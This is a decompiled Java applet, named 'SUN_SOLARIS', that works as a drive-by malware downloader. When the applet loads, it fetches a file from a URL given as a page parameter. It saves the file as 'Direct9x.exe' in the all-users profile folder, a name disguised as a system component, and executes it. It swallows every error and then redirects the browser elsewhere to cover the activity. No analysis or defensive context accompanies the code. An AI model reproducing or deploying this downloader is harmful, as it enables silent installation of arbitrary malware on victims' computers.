import java.io.InputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class SUN_SOLARIS extends Applet
{
    @Override
    public void init() {
        final String concat = System.getenv("ALLUSERSPROFILE").concat("\\Direct9x.exe");
        final String parameter = this.getParameter("redir");
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(concat);
            final Runtime runtime = Runtime.getRuntime();
            final InputStream inputStream = new URL(this.getParameter("link")).openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array, 0, array.length)) != -1) {
                fileOutputStream.write(array, 0, read);
            }
            inputStream.close();
            fileOutputStream.close();
            runtime.exec(concat);
            this.getAppletContext().showDocument(new URL(parameter));
        }
        catch (Exception ex) {}
    }
}
